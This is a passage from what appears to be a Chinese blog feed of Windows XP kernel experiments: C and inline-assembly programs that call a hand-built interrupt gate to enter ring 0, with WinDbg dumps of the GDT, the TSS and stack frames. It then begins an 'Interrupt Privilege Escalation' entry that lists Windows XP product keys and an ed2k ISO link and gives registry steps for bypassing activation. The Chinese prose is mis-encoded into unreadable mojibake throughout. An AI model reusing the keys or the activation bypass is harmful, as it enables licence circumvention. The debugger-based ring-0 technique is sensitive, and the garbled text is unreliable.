class="number">4</span>], ebp</span><br><span class="line">        mov[g_cs + <span class="number">2</span>], cs</span><br><span class="line">        mov[g_ds + <span class="number">2</span>], ds</span><br><span class="line">        mov[g_es + <span class="number">2</span>], es</span><br><span class="line">        mov[g_fs + <span class="number">2</span>], fs</span><br><span class="line">        mov[g_gs + <span class="number">2</span>], gs</span><br><span class="line">        mov[g_ss + <span class="number">2</span>], ss</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags0]</span><br><span class="line">        mov[g_eax], eax</span><br><span class="line">        mov[g_ebx], ebx</span><br><span class="line">        mov[g_ecx], ecx</span><br><span class="line">        mov[g_edx], edx</span><br><span class="line">        mov[g_esi], esi</span><br><span class="line">        mov[g_edi], edi</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ebp], ebp</span><br><span class="line">        mov[g_cs], cs</span><br><span class="line">        mov[g_ds], ds</span><br><span class="line">        mov[g_es], es</span><br><span class="line">        mov[g_fs], fs</span><br><span class="line">        mov[g_gs], gs</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">0</span>], g_ebx[<span class="number">0</span>], g_ecx[<span class="number">0</span>], g_edx[<span class="number">0</span>], g_esi[<span class="number">0</span>], g_edi[<span class="number">0</span>], g_esp[<span class="number">0</span>], g_ebp[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;eax:%x\t ebx:%x\t ecx:%x\t edx:%x\t esi:%x\t edi:%x\t esp:%x\t ebp:%x\t\n&quot;</span>,</span><br><span class="line">        g_eax[<span class="number">1</span>], g_ebx[<span class="number">1</span>], g_ecx[<span class="number">1</span>], g_edx[<span class="number">1</span>], g_esi[<span class="number">1</span>], g_edi[<span class="number">1</span>], g_esp[<span class="number">1</span>], g_ebp[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">0</span>], g_ds[<span class="number">0</span>], g_es[<span class="number">0</span>], g_fs[<span class="number">0</span>], g_gs[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs:%x\t ds:%x\t es:%x\t fs:%x\t gs:%x\t ss:%x\t\n&quot;</span>,</span><br><span class="line">        g_cs[<span class="number">1</span>], g_ds[<span class="number">1</span>], g_es[<span class="number">1</span>], g_fs[<span class="number">1</span>], g_gs[<span class="number">1</span>], g_ss[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;efalgs0:0x%x\nefalgs0x%x&quot;</span>,g_eflags0,g_eflags);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">eax:<span class="number">401040</span>       ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:<span class="number">12f</span>f7c      ebp:<span class="number">12f</span>fc0</span><br><span class="line">eax:<span class="number">401040</span>       ebx:<span class="number">7f</span>fd9000    ecx:b2ede300    edx:<span class="number">7</span>c92eb94    esi:<span class="number">419</span>cf0</span><br><span class="line"> edi:<span class="number">154</span>d58      esp:b2cdfdcc    ebp:<span class="number">12f</span>fc0</span><br><span class="line">cs:<span class="number">1b</span>    ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">23</span></span><br><span class="line">cs:<span class="number">8</span>     ds:<span class="number">23</span>   es:<span class="number">23</span>   fs:<span class="number">3b</span>   gs:<span class="number">0</span>    ss:<span class="number">10</span></span><br><span class="line">efalgs0:<span class="number">0x246</span></span><br><span class="line">efalgs0x46</span><br></pre></td></tr></table></figure><p>ä¸­æ–­å‰åå˜å¾—åªæœ‰ï¼Œeflags:0x246â€“&gt;0x46  esp:12ff7c-&gt;b2d13dcc  cs:1bâ€“&gt;8 ss:23â€“&gt;10</p><p>1b(0001 1011) â€“&gt; 8(1000)</p><p>23(0010 0011) â€“&gt; 10(0001 0000)</p><h3 id="dsä¸ºä»€ä¹ˆè¿˜æ˜¯23ï¼Œæ²¡æœ‰æå‡åˆ°å†…æ ¸"><a href="#dsä¸ºä»€ä¹ˆè¿˜æ˜¯23ï¼Œæ²¡æœ‰æå‡åˆ°å†…æ ¸" class="headerlink" title="dsä¸ºä»€ä¹ˆè¿˜æ˜¯23ï¼Œæ²¡æœ‰æå‡åˆ°å†…æ ¸?"></a><strong>dsä¸ºä»€ä¹ˆè¿˜æ˜¯23ï¼Œæ²¡æœ‰æå‡åˆ°å†…æ ¸?</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; dg <span class="number">23</span></span><br><span class="line">                                  P Si Gr Pr Lo</span><br><span class="line">Sel    Base     Limit     Type    l ze an es ng Flags</span><br><span class="line">---- -------- -------- ---------- - -- -- -- -- --------</span><br><span class="line"><span class="number">0023</span> <span class="number">00000000</span> ffffffff Data RW Ac <span class="number">3</span> Bg Pg P  Nl <span class="number">00000</span>cf3</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°dsæ˜¯ä¸€ä¸ªå¹³å¦æ®µï¼Œå¯ä»¥è®¿é—®æ•´ä¸ª4gbï¼Œåˆ†æ®µä¿æŠ¤æœºåˆ¶å…¶å®æ˜¯åœ¨å¼±åŒ–ï¼Œåªæ˜¯æä¾›äº†è¿›ç¨‹éš”ç¦»ï¼Œå…·ä½“è®¿é—®ä¿æŠ¤æ˜¯ç”±åˆ†é¡µæœºåˆ¶æ¥æä¾›çš„</p><h3 id="eflagså˜åŒ–"><a href="#eflagså˜åŒ–" class="headerlink" title="eflagså˜åŒ–?"></a><strong>eflagså˜åŒ–?</strong></h3><p>ç¬¬ä¹ä½å˜ä¸º0äº†ï¼Œä¹Ÿå°±æ˜¯IFä½ç½®é›¶ï¼Œä¸­æ–­å¤„ç†è¿‡ç¨‹å…³ä¸­æ–­</p><h3 id="csæ®µé€‰æ‹©å­ä¸ºä»€ä¹ˆä¼šæ˜¯8ï¼Ÿ"><a href="#csæ®µé€‰æ‹©å­ä¸ºä»€ä¹ˆä¼šæ˜¯8ï¼Ÿ" class="headerlink" title="csæ®µé€‰æ‹©å­ä¸ºä»€ä¹ˆä¼šæ˜¯8ï¼Ÿ"></a><strong>csæ®µé€‰æ‹©å­ä¸ºä»€ä¹ˆä¼šæ˜¯8ï¼Ÿ</strong></h3><p>å’Œæˆ‘ä»¬æ„é€ çš„<strong>ä¸­æ–­é—¨</strong>æœ‰å…³ç³» ä»–çš„16-31ä½ä¸ºä¸­æ–­å¤„ç†ç¨‹åºç›®æ ‡ä»£ç æ®µé€‰æ‹©å­ å³ä¸ºä¸‹é¢çš„0008</p><p>eq 8003f500  0040ee00&#96;00081040</p><p>dg xå‘½ä»¤æ˜¾ç¤ºæ®µé€‰æ‹©å­xæ‰€æŒ‡å‘çš„æ®µæè¿°ç¬¦</p><h3 id="sså’Œspæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ"><a href="#sså’Œspæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ" class="headerlink" title="sså’Œspæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ"></a><strong>sså’Œspæ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ</strong></h3><p>ä»tssæ®µé‡Œå–å‡ºæ¥çš„ï¼ŒTRå¯„å­˜å™¨ä¸­å­˜æ”¾ç€æŒ‡å‘å½“å‰ä»»åŠ¡TSSæ®µçš„æ®µé€‰æ‹©å­</p><p>str [g_tr] æŠŠå½“å‰ä»»åŠ¡ï¼ˆä»»åŠ¡çŠ¶æ€æ®µTSSï¼‰çš„é€‰æ‹©å™¨å­˜å‚¨åˆ°æŒ‡å®šçš„ä½ç½®ä¸Šçœ‹ä¸‹æ˜¯0x28 å³ç§»3ä½æ‰€ä»¥æ˜¯gdtè¡¨ç¬¬5ä¸ªå³ä¸ºtssæ®µæè¿°ç¬¦</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528174545899.png" alt="image-20230528174545899"></p><p>TYPEçš„Bæ˜¯æŒ‡ä»»åŠ¡æ˜¯å¦å¤„äºå¿™çŠ¶æ€(å½“å‰æ­£åœ¨æ‰§è¡Œæˆ–è¢«æŒ‚èµ·ç­‰å¾…æ‰§è¡Œ)ï¼Œå¿™ä¸º1</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; r gdtr</span><br><span class="line">gdtr=<span class="number">8003f</span>000</span><br><span class="line">kd&gt; dq <span class="number">8003f</span>000+<span class="number">8</span>*<span class="number">5</span> l1</span><br><span class="line"><span class="number">8003f</span>028  <span class="number">80008b</span>04`<span class="number">200020</span>ab</span><br></pre></td></tr></table></figure><p>typeä¸º1011</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528172940147.png" alt="image-20230528172940147"></p><p>è¿™ä¸ªåŸºåœ°å€å°±æ˜¯ä»»åŠ¡çŠ¶æ€æ®µTSS(Task state segment)æ‰€åœ¨å¤„ï¼Œå³ä¸ºä¸‹é¢çš„ç»“æ„</p><p>å…¶ä¸­çº¢è‰²çš„å«åšé™æ€å­—æ®µï¼Œåœ¨ä»»åŠ¡åˆ›å»ºæ˜¯è®¾ç½®ï¼Œä¸€èˆ¬ä¸ä¼šæ”¹å˜</p><p>ç»¿è‰²çš„å«åšåŠ¨æ€å­—æ®µï¼Œæ—¶å¸¸æ›´æ–°</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528175556760.png" alt="image-20230528175556760"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">WORD g_tr;</span><br><span class="line">DWORD g_80042004, g_80042008;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov[g_esp], esp</span><br><span class="line">        mov[g_ss], ss</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042004</span>]</span><br><span class="line">        mov[g_80042004], eax</span><br><span class="line">        mov eax, ds:[<span class="number">0x80042008</span>]</span><br><span class="line">        mov[g_80042008],eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp0: 0x%x\tss0: 0x%hx&quot;</span>,g_80042004,g_80042008);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">esp:  <span class="number">0xb29d3dcc</span>         ss: <span class="number">0x10</span></span><br><span class="line">esp0: <span class="number">0xb29d3de0</span>        ss0: <span class="number">0x10</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥éªŒè¯åˆ°ï¼Œå°±æ˜¯ä»tssé‡Œé¢å»å–å†…æ ¸æ ˆ</p><h3 id="ä¸ºä»€ä¹ˆespæ ˆé¡¶æå‡äº†0x14ï¼Œæ ˆé‡Œå‹äº†5ä¸ªä»€ä¹ˆ"><a href="#ä¸ºä»€ä¹ˆespæ ˆé¡¶æå‡äº†0x14ï¼Œæ ˆé‡Œå‹äº†5ä¸ªä»€ä¹ˆ" class="headerlink" title="ä¸ºä»€ä¹ˆespæ ˆé¡¶æå‡äº†0x14ï¼Œæ ˆé‡Œå‹äº†5ä¸ªä»€ä¹ˆ"></a><strong>ä¸ºä»€ä¹ˆespæ ˆé¡¶æå‡äº†0x14ï¼Œæ ˆé‡Œå‹äº†5ä¸ªä»€ä¹ˆ</strong></h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">DWORD g_eax[<span class="number">2</span>], g_ebx[<span class="number">2</span>], g_ecx[<span class="number">2</span>], g_edx[<span class="number">2</span>], g_esi[<span class="number">2</span>], g_edi[<span class="number">2</span>], g_esp[<span class="number">2</span>], g_ebp[<span class="number">2</span>];</span><br><span class="line">WORD g_cs[<span class="number">2</span>], g_ds[<span class="number">2</span>], g_es[<span class="number">2</span>], g_fs[<span class="number">2</span>], g_gs[<span class="number">2</span>], g_ss[<span class="number">2</span>];</span><br><span class="line">DWORD g_eflags;</span><br><span class="line">DWORD g_stack[<span class="number">5</span>];</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax, dword ptr ss:[esp]</span><br><span class="line">        mov dword ptr [g_stack], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">4</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">4</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">8</span>]</span><br><span class="line">        mov dword ptr [g_stack + <span class="number">8</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">12</span>]</span><br><span class="line">        mov dword ptr [g_stack +<span class="number">12</span>], eax</span><br><span class="line">        mov eax, dword ptr ss:[esp+<span class="number">16</span>]</span><br><span class="line">        mov dword ptr [g_stack+<span class="number">16</span>], eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        pushfd</span><br><span class="line">        pop [g_eflags]</span><br><span class="line">        mov [g_ss],ss</span><br><span class="line">        mov [g_esp],esp</span><br><span class="line">        mov [g_cs],cs</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x401040</span> != IdtEntry) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;IdtRntry address wrong&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    interrupt();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cs: 0x%x\teflags: 0x%hx\t&quot;</span>,g_cs[<span class="number">0</span>],g_eflags);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;esp: 0x%x\tss: 0x%x\n&quot;</span>, g_esp[<span class="number">0</span>], g_ss[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;stack[%d]:0x%x\n&quot;</span>,i,g_stack[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">cs: <span class="number">0x1b</span>        eflags: <span class="number">0x246</span>   esp: <span class="number">0x12ff78</span>   ss: <span class="number">0x23</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">0</span>]:<span class="number">0x4010aa</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">1</span>]:<span class="number">0x1b</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">2</span>]:<span class="number">0x246</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">3</span>]:<span class="number">0x12ff78</span></span><br><span class="line"><span class="built_in">stack</span>[<span class="number">4</span>]:<span class="number">0x23</span></span><br><span class="line">è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .</span><br></pre></td></tr></table></figure><p>æ ˆé‡Œç¬¬ä¸€ä¸ªæ˜¯è¿”å›åœ°å€ï¼Œåé¢åˆ†åˆ«æ˜¯ä¸‰ç¯çš„cs eflags esp ssï¼Œå’Œä¹‹å‰ç†è®ºæ˜¯ä¸€æ ·çš„(å‡ºé”™ç æ˜¯å¯é€‰çš„)ï¼Œiretæ—¶ä¼šå¼¹å‡ºæ¥</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528225918572.png" alt="image-20230528225918572"></p><blockquote><p>æ ˆé¡¶çš„è¿”å›åœ°å€æ€ä¹ˆæ¥è°ƒè¯•éªŒè¯?</p><p>ç›´æ¥åœ¨IdtEntryé‡Œå†™ä¸Šint3 ï¼Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        <span class="type">int</span> <span class="number">3</span></span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">interrupt</span><span class="params">()</span> &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push eax</span><br><span class="line">        pop eax</span><br><span class="line">        <span class="type">int</span> <span class="number">0x20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸æŒ‚è°ƒè¯•å™¨ä¼šæŠ¥é”™ï¼ŒæŒ‚äº†è°ƒè¯•å™¨ä¼šåœ¨int3å¤„æ–­ä¸‹æ¥</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">00401040 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r esp</span></span><br><span class="line">esp=b2cf3dcc</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dps b2cf3dcc l5</span></span><br><span class="line">b2cf3dcc  00401061</span><br><span class="line">b2cf3dd0  0000001b</span><br><span class="line">b2cf3dd4  00000246</span><br><span class="line">b2cf3dd8  0012ff78</span><br><span class="line">b2cf3ddc  00000023</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">ub 00401061 l4</span></span><br><span class="line">0040105b 756d            jne     004010ca</span><br><span class="line">0040105d 50              push    eax</span><br><span class="line">0040105e 58              pop     eax</span><br><span class="line">0040105f cd20            int     20h</span><br></pre></td></tr></table></figure><p>è¿”å›åœ°å€ç¡®å®æ˜¯int  20hä¸­æ–­åçš„ä¸‹ä¸€æ¡æŒ‡ä»¤</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230527235756049.png" alt="image-20230527235756049"></p><p>cså’Œssé€‰æ‹©å­çš„RPL(CPL)éƒ½å˜ä¸º0ï¼Œä»£è¡¨å½“å‰æ­£åœ¨æ‰§è¡Œçš„ç¨‹åºæˆ–ä»»åŠ¡çš„ç‰¹æƒçº§åˆ«ä¸ºå†…æ ¸æƒé™</p><p>windbg</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtr</span></span><br><span class="line">gdtr=8003f000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r gdtl</span></span><br><span class="line">gdtl=000003ff</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq 8003f000 l20</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">8003f010  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">8003f020  00cff300`0000ffff 80008b04`200020ab</span><br><span class="line">8003f030  ffc093df`f0000001 0040f300`00000fff</span><br><span class="line">8003f040  0000f200`0400ffff 00000000`00000000</span><br><span class="line">8003f050  80008955`17000068 80008955`17680068</span><br><span class="line">8003f060  00009302`2f30ffff 0000920b`80003fff</span><br><span class="line">8003f070  ff0092ff`700003ff 80009a40`0000ffff</span><br><span class="line">8003f080  80009240`0000ffff 00009200`00000000</span><br><span class="line">8003f090  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0a0  8200891e`a9400068 00000000`00000000</span><br><span class="line">8003f0b0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0c0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0d0  00000000`00000000 00000000`00000000</span><br><span class="line">8003f0e0  f8009f71`a000ffff 00009200`0000ffff</span><br><span class="line">8003f0f0  8000984f`ccd403b7 00009200`0000ffff</span><br></pre></td></tr></table></figure><blockquote><p>GDTä¸­ç¬¬ä¸€ä¸ªè¡¨é¡¹ï¼ˆ0å·ï¼‰çš„æè¿°ç¬¦ä¿ç•™ä¸ç”¨ï¼Œç§°ä¸ºç©ºæè¿°ç¬¦</p></blockquote><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001616020.png" alt="image-20230528001616020"></p><p>æŒ‰ç…§ä¸Šå›¾è§£æ</p><p><img src="/2023/05/28/Windows-Kernel-Experiment-interrupt-handling/image-20230528001515527.png" alt="image-20230528001515527"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windowså†…æ ¸å®éªŒ:ä¸­æ–­ææƒ(Interrupt Privilege Escalation)</title>
      <link href="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/"/>
      <url>/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/</url>
      
        <content type="html"><![CDATA[<h1 id="Windowså†…æ ¸å®éªŒ-ä¸­æ–­ææƒ-Interrupt-Privilege-Escalation"><a href="#Windowså†…æ ¸å®éªŒ-ä¸­æ–­ææƒ-Interrupt-Privilege-Escalation" class="headerlink" title="Windowså†…æ ¸å®éªŒ:ä¸­æ–­ææƒ(Interrupt Privilege Escalation)"></a>Windowså†…æ ¸å®éªŒ:ä¸­æ–­ææƒ(Interrupt Privilege Escalation)</h1><h2 id="åŒæœºè°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#åŒæœºè°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="åŒæœºè°ƒè¯•ç¯å¢ƒæ­å»º"></a>åŒæœºè°ƒè¯•ç¯å¢ƒæ­å»º</h2><p>ä»32ä½çš„xpå¼€å§‹ï¼Œæ…¢æ…¢ä¸Š64ä½</p><p>Windows XP Home Edition with Service Pack 2 (Simplified Chinese) </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ed2k:<span class="comment">//|file|sc_winxp_home_with_sp2.iso|61135872    0|B80F4CCF312420015FFD5740057085B0|/</span></span><br></pre></td></tr></table></figure><p>Home Edition with Service Pack 2  xpæ¿€æ´»ç  </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">8</span>QKF3-VDWXY-CT6TM<span class="number">-7</span>TGG6-GKR9G</span><br></pre></td></tr></table></figure><p>Windows XP Professional with Service Pack 2 (Simplified Chineseæ¿€æ´»ç </p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">BB96V<span class="number">-433</span>XK-GM9WR-KXCDJ<span class="number">-4</span>HTQW</span><br></pre></td></tr></table></figure><p>zh-hans_windows_xp_professional_with_service_pack_3_x86_cd</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MRX3F<span class="number">-47B</span>9T<span class="number">-2487</span>J-KWKMF-RPWBY</span><br><span class="line">DP7CM-PD6MC<span class="number">-6B</span>KXT-M8JJ6-RPXGJ</span><br></pre></td></tr></table></figure><blockquote><p>çƒ¦äºº åªæœ‰sp3æ”¯æŒwindbgè¿œç¨‹æœåŠ¡å™¨ç¬¦å·æ¯”è¾ƒå…¨</p></blockquote><p>æ¿€æ´»</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ï¼ˆ<span class="number">1</span>ï¼‰ç‚¹å‡»â€œå¼€å§‹â€â€”â€”è¿è¡Œâ€”â€”è¾“å…¥regedit â€”â€”å›è½¦ ã€‚æ­¤æ—¶è¿›å…¥æ³¨å†Œè¡¨ç¼–è¾‘å™¨ã€‚</span><br><span class="line">ï¼ˆ<span class="number">2</span>ï¼‰æ‰¾åˆ°ä¸»é”® Hkey_Local_Machine\Software\Microsoft\WindowsNT\CurrentVersion\WPAEvents\</span><br><span class="line">ï¼ˆ<span class="number">3</span>ï¼‰åˆ é™¤å­é”® lastWPAEventLoged ï¼ˆå³å‡»ï¼Œåˆ é™¤ï¼‰</span><br><span class="line">ï¼ˆ<span class="number">4</span>ï¼‰ï¼ˆå³å‡»ï¼Œâ€œä¿®æ”¹â€ï¼‰ä¿®æ”¹å­é”® OOBETimer é”®å€¼ä¸ºï¼šff d5 <span class="number">71</span> d6 <span class="number">8b</span> <span class="number">6</span>a <span class="number">8</span>d <span class="number">6f</span> d5 <span class="number">33</span> <span class="number">93</span> fd </span><br><span class="line">ï¼ˆ<span class="number">5</span>ï¼‰å³å‡»æ³¨å†Œè¡¨ä¸­çš„â€œWPAEventsâ€â†’â€œæƒé™â€â†’â€œé«˜çº§â€â†’â€œæ‰€æœ‰è€…â€â†’ä½ çš„ç”¨æˆ·åâ†’â†’â€œç¡®å®šâ€</span><br><span class="line">ï¼ˆ<span class="number">6</span>ï¼‰å›åˆ°â€œå®‰å…¨â€â†’â€œé«˜çº§â€â†’é€‰æ‹©åˆ—è¡¨ä¸­çš„â€œsystemâ€â†’â€œç¼–è¾‘â€ ï¼ŒæŠŠâ€œæ‹’ç»â€åˆ—ä¸‹çš„æ–¹æ¡†å…¨éƒ¨æ‰“å‹¾å³å¯ ï¼ˆå‹¾â€œå®Œå…¨æ§åˆ¶â€å³å¯ï¼‰ï¼Œç¡®å®šï¼Œé€€å‡ºã€‚</span><br></pre></td></tr></table></figure><p>ç»™è™šæ‹Ÿæœºå¼€ä¸ªä¸²è¡Œç«¯å£ï¼Œç”¨ç®¡é“æ¥é€šä¿¡ï¼Œåå­—com_2</p><blockquote><p>com_1çš„åå­—æœ‰æ‰“å°æœºçš„è¯ï¼Œä¼šè¢«æ‰“å°æœºå å»</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\\.\pipe\com_2</span><br></pre></td></tr></table></figure><p><img src="/2023/05/26/Windows-Kernel-Experiment-Interrupt-Privilege-Escalation/image-20230526010718133.png" alt="image-20230526010718133"></p><p>boot.iniæ–‡ä»¶é‡Œæ·»åŠ ä¸‹é¢ä¸€å¥ </p><blockquote><p>COM1æ˜¯å› 